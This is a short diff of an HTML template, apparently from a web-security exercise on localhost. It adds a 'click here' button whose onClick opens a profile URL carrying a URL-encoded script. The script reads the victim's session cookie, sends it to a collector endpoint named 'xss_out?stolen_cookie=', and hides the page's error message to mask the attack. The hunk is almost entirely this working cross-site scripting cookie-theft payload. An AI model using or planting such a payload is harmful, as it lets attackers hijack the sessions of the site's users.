@@ -33,6 +33,8 @@
   {% endif %}
 </div>
 
+<input type=button onClick= "window.location='http://localhost:8080/profile/%3Cscript%3Evar%20img%20%3D%20new%20Image()%3B%20var%20endpoint%20%3D%20%22http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D%22%3B%20var%20cookieValue%20%3D%20document.cookie.replace(%2F(%3F%3A(%3F%3A%5E%7C.*%3B%5Cs*)session%5Cs*%5C%3D%5Cs*(%5B%5E%3B%5D*).*%24)%7C%5E.*%24%2F%2C%20%27%241%27)%3B%20img.src%20%3D%20endpoint%20%2B%20cookieValue%3B%20document.getElementsByClassName(%22error%22)%5B0%5D.style.visibility%20%3D%20%22hidden%22%3C%2Fscript%3E%0A'"  value='click here'>
+
 <script>
 	function getCookie(cname) {
 	  var name = cname + "=";
